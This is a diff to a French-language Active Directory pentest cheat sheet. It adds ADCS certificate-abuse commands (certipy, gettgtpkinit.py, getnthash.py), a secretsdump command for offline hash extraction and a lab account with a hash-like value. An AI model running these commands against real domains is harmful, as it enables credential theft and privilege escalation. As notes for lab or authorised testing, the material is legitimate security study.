@@ -70,6 +70,11 @@ date: '2024-01-10'
   - [Dump NTDS](#dump-ntds)
     - [Windows](#windows-8)
     - [Linux](#linux-7)
+  - [ADCS](#adcs)
+    - [Info sur ADCS](#info-sur-adcs)
+    - [création de certificats](#création-de-certificats)
+    - [Demande de TGT avec un certificat](#demande-de-tgt-avec-un-certificat)
+    - [Récupération du hash via un tgt](#récupération-du-hash-via-un-tgt)
 - [Lab](#lab)
   - [**AD**](#ad)
   - [Srv standelone](#srv-standelone)
@@ -347,7 +352,7 @@ reg save HKLM\SYSTEM "\\ip\SHARE\system.save"
 ### Traitement 
 
 ```
-
+secretdump LOCAL -sam sam.save -security security.save -system system.save
 ```
 
 ## MSSQL
@@ -518,6 +523,33 @@ secretsdump.py DAuser:password@dc.domain.local -just-dc-user krbtgt
 nxc smb dc01.domain.local -u 'DAuser' -p 'password' --ntds --user krbtgt
 ```
 
+## ADCS
+
+### Info sur ADCS
+
+```
+nxc ldap dc.domain.local -u 'user' -p 'password' -M adcs
+```
+
+### création de certificats
+
+```
+certipy req  -ca 'caName' -u 'user' -p 'password' -target-ip adcs.klemou.corp
+```
+
+### Demande de TGT avec un certificat
+
+```
+gettgtpkinit.py -cert-pfx cert.pfx -dc-ip dc.domain.local domain.local/user tgt.ccache
+```
+
+### Récupération du hash via un tgt 
+
+```
+getnthash.py -k key  -dc-ip dc.domain.local domain.local/user
+```
+
+
 
 # Lab
 
@@ -532,6 +564,7 @@ sql_svc       : 515aa2db9.749107818e6
 hugo          : e0eec4062.cbc38dd8f38
 sql_mngt      : 5486a9646.1b307dcf720
 ndes          : f77c171f50.001b01ade5
+adcs_adm      : b2a1349450.64025f1b0e
 
 Local Adm     : 4eaf07215.645eb0e68f6
 ```
